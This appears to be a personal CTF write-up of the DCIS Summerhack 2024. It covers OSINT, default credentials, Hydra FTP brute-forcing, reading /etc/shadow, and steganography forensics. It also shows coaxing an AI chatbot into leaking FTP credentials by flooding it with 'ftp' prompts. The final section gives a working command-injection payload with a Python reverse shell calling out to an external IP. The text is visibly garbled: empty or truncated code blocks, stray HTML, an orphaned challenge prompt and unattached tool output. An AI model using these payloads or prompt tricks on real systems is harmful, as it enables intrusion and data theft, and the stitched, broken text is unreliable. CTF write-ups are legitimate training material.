# DCIS Summerhack 2024

I recently took part in the DCIS Summer Hack CTF event hosted by DCIS in July 2024. It was a fun and challenging competition where I tackled various cybersecurity puzzles and scenarios, including the categories like Boot2Root, Forensics, and Web Exploitation among others.

The starter category is pretty unexciting, so there aren't many notes for these challenges as they are pretty self-explanatory.

The entire Misc category consisted of a series of challenges on a single website, _peacook.hkn_, which resembled a Facebook-like platform. The main objective was to use OSINT to gather intelligence on various fictional individuals and complete other "easy" tasks. The overall purpose of the series was to raise awareness about the type of information you share online and how it can be used against you. Most of the challenges in this category don't have comprehensive notes because they were primarily visual.

I finished on first place with a score of 612 points.

Oh, and there was Minecraft involved in the beginning, which I'm pretty sure is becoming a recurring theme in my HKN{Ylh-es-vYDUV}. I don't know why that happened, because I rarely play Minecraft anymore. Do any of y'all remember the DVD screensaver meme? That was one of my favorite memes.

  <script src="assets/js/main.js"></script>

  <!-- Hmmmm, nothing interesting in this file, where could it be??? -->

You're a cyber attacker aiming to cause chaos and manipulate the traffic control system. You can reach the admin login for Siemens ST950 traffic control, but a password blocks access. You only know that SCADA is a strange love.**

Found the default credentials on a random website by google dorking.

## Operational Tech Quest - Medical device
**Category - Operational Technologies**


**One of the primary challenges in OT security is the prevalence of weak and default passwords. Insecure credentials can lead to unauthorized access, potentially jeopardizing the integrity and safety of critical systems. As a cybersecurity expert, you've been tasked with investigating a breach of the ClinicPro EMR system, a medical device that stores sensitive patient information. Your mission is to identify the credentials and secure the system to prevent further data breaches. The format of the flag is as follows: HNK{username:password}. Good luck in your quest to secure the OT world and discover the hidden flags!"**

This challenge is a OSINT challenge, which stand for *Open Source Intelligence* which is indicated from the description. It seems that we are looking for default credentials to a device called ClinicPRO EMR System.

After a quick Google search for `clinicpro emr system default username and password` the very first search result return the solution for the challenge.

```
ClinicPro ClinicPro EMR Login Guide

- Open your web browser (e.g. Chrome, Firefox, Opera or any other browser)
- Click [HERE](http://my-router-ip.192-168-1-1-ip.co/) to auto detect your router IP. After some seconds our tool will show a link to your router login page. Click on the shown link.
- You should see 2 text fields where you can enter a username and a password. 
- The default username for your ClinicPro ClinicPro EMR is admin.  
    The default password is abc123.
- Enter the username & password, hit "Enter" and now you should see the control panel of your router.
```
So from this info we can get the flag

**Flag:** `HNK{admin:abc123}`

## Operational Tech Quest - ICS
**Category - Operational Technologies**


**What is Operational Technology (OT)? Operational Technology, commonly known as OT, refers to the hardware and software used to monitor and control physical processes, devices, and infrastructure in various industrial sectors. It plays a vital role in critical infrastructure, such as energy, manufacturing, and healthcare. Briefly Defined Components:  
SCADA (Supervisory Control and Data Acquisition): A centralized control system used to manage and monitor industrial processes. PLC (Programmable Logic Controller): A specialized computer for industrial automation, used to control machinery and processes. RTU (Remote Terminal Unit): A device that connects remote sensors and controls to a central system. HMI (Human-Machine Interface): The interface between humans and machines, allowing operators to interact with industrial processes. In the realm of OT, you'll frequently encounter the term "ICS". Your first challenge is to uncover the hidden meaning behind "ICS".**

**This challenge is a simple riddle, find out what ICS stand for and insert it as the flag.**

When you search for `Operational technology ICS`in Google, the first respond is:

```
Industrial control systems (ICS) are a main component of operational technology. ICS includes different types of devices, systems, controls, and networks that manage a variety of industrial processes. The most common are supervisory control and data acquisition (SCADA) systems and distributed control systems (DCS).
```

We can then assume that ICS stand for *Industrial Control Systems* - the difficult part of this challenge is to find how out how to format the flag. I just went through a lot of trial and error and eventually got the flag.

**Flag:** `HKN{industrial_control_systems}`

## Flag Transfer Protocol

**Er der mon en "admin" der har en port åben for at overføre filer? Og har han mon tænkt over at John lurer i skyggerne?**

First I started by scanning the network I was connected to:

```

Based on the challenge description, it is plausible that the username is 'admin'. We can use the rockyou.txt file with Hydra against the FTP service.

## Shadow

**Jeg har lavet en ssh server sådan at jeg kan dele den med alle! Det er bare så super hyggeligt at dele. Men i må altså gerne lige lade være med at rode rundt. Jeg er ikke helt sikker på at jeg har styr på alle tilladelser endnu.**

**Brug kommandoen ssh user1@shadow.hkn for at komme igang. Koden er start.**

Since the name of the challenge is 'Shadow', I assumed it had something to do with the shadow file on a Linux system, which holds the hash values of user passwords.

I made this server so that people could read the files on my computer. 
I think it is secure enough to let people roam around. 
Hopefully they don't find what is hiding in the shadows.

user1@shadow.hkn's password: 
$ ls
Hello  order  poem

```

So, I navigated to the folder where the shadow file is located and displayed its contents. Normally, you can't view this file unless you are root, but the description mentioned something about altered permissions.
```
$ cat /etc/shadow

## Campfire Stories
**Category - Boot2Root**


**Besøg `campfire-stories.hkn` og lad de varme flammer og lugten af røg inspirere dig.**

First, I started by examining the index.html file to see if there was anything interesting in the code.

`<--Can someone check robots.txt? I have some ethical concerns-->`

From the campfire.stories.hkn/robots.txt

```
# https://www.robotstxt.org/robotstxt.html
# Maybe we should not train on company data?
# Could our ftp credentials be leaked by the AI?
# Probably not a problem. Nobody writes stories about ftp anyway
# datacenter.campfire-stories.hkn should still be safe right?
User-agent: *
Disallow: /
Allow: /$
Allow: /share/*
Allow: /images/*
Allow: /static/*
```

The challenge is set up like a ChatGPT-like website that is trained on company data. Since it mentions leaking FTP credentials, I created a large prompt containing 'ftp' repeatedly.

Response:

```
suddenly the firewall was bypassed and an excited and happy hacker had now access to the ftp server! 
With the cracking of "Z3B0OTAwMA==", and a couple of keystrokes "admin" access was gained.

We're in!
```

From the response, it seemed that I needed to connect to something else using the credentials of an admin account, where the password is the decoded Base64 value.

The decoded Base64 value `Z3B0OTAwMA==` is equal to `gpt9000`.

I then ran an Nmap scan to see what else was on the network.

**Jeg er freelancefotograf, og jeg har lige fået en ny hjemmeside til at poste mit arbejde.**

**Du kan finde mange af mine fotografier på `http://jenny-willson.hkn/`, og der kommer snart flere!**

I didn't find anything interesting while browsing the site. However, when I checked `robots.txt`, I found something of interest:

```

Disallow: /admin/* 
Disallow: /assets/img/gallery-drafts/gallery-*.jpg

The `assets` directory caught my attention. From the main webpage, I noticed there were images numbered from 1 to 18, and some of them didn’t load.

I tried the images that didn’t work on the website in the drafts folder and found the flag in image 10.

# En bankrøvers bekendelser
**Category - Forensics**


**Vi har holdt lidt øje med en bandit vi mistænker for at planlægge et røveri - vi ved bare ikke hvor. Vi fik heldigvis en kendelse til at anholde ham, og ransage hans hjem. Desværre kan vi ikke finde noget, og vi må lade ham gå igen medmindre du kan hjælpe. Der var intet på hans computer, men han havde en virtuel maskine der var krypteret... Det eneste vi fandt var en virtuel hukommelsesfil, et billede af en lasagne og et notat: "slet huskeliste"- er det noget du kan bruge?**

For this challenge, you receive the following files: `lasagne.jpg`, `mem.vmem`, and `mem.vmss`.

Below are some of the notes I wrote while attempting to solve the challenge. I can't remember exactly what I did at each step, but I used Volatility3, a forensic tool that can analyze memory files and dump files from memory.

```

```

The content of the file `huskeliste.txt` resembled a password.

```

:) Hehe :) 
```

Using the command `steghide info lasagne.jpg` reveals that there is a hidden `Planer.rar` file within the JPEG.

```

  embedded file "Planer.rar":

```

I tried extracting the RAR file using the following command.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf lasagne.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Unfortunately, the password didn’t work.

I wrote a Python script to generate all possible combinations of the password, in case there was a mistake made by the creator of the challenge.

```
import itertools

def generate_case_permutations(s):
    """Generate all possible case permutations of a string."""
    cases = [[char.lower(), char.upper()] if char.isalpha() else [char] for char in s]
    return [''.join(comb) for comb in itertools.product(*cases)]

def write_permutations_to_file(perms, filename='pass.txt'):
    """Write permutations to a file."""
    with open(filename, 'w') as file:
        for perm in perms:
            file.write(f"{perm}\n")

if __name__ == "__main__":
    string = "MinLivretErLasagne06"
    permutations = generate_case_permutations(string)
    write_permutations_to_file(permutations)
```

That didn’t work either.

Feeling that I was on the right track, I searched the internet for information that might help. I came across a [website](https://quack711.com/posts/ddc24-regional-writeups/) that had already solved the challenge using the password `MinLivretErLasagne06`. For some reason, it didn’t work for me. The flag was located inside `PlanSnedig.txt`, which was within `Planer.rar`.

Information: limited dump file format detected!
This file format is a very basic format to save captured network data.
It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
The PCAP Next Generation dump file format is an attempt to overcome the limitations
of the currently widely used (but limited) libpcap (cap, pcap) format.

## Challenge 21
**Category - Boot2Root**


**Jeg laver en web-app for at få adgang til forskellige værktøjer. Det er stadig i beta, men du kan tjekke det på toolbox.hkn.**

I discovered that it was possible to perform a command injection in the ping section of the site by using the `; <insert command>` character.

I tried various reverse shells, but many of them failed until I used `python3 shortest` from [RevShells](https://www.revshells.com/).

I successfully obtained a reverse shell using the following command:

```
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("77.230.224.5",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

I gained a shell and root privileges by using default credentials.
